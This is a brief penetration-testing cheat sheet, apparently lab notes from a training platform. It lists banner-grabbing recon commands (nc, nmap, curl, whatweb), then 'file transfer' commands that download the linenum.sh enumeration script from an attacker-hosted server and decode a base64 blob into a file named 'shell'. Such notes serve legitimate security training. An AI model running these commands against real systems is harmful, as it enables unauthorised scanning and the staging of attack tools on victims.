# Banner Graping
```bash
nc -nv <ip> <port>

nmap -sV --script=banner -p21 10.10.10.0/24

curl -IL https://www.inlanefreight.com

whatweb --no-errors 10.10.10.0/24

ssl certificate

http://10.10.10.10/robots.txt

javascript source code
```
---
# File transfer
```bash
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

echo <base64 encoded file> | base64 -d > shell
```
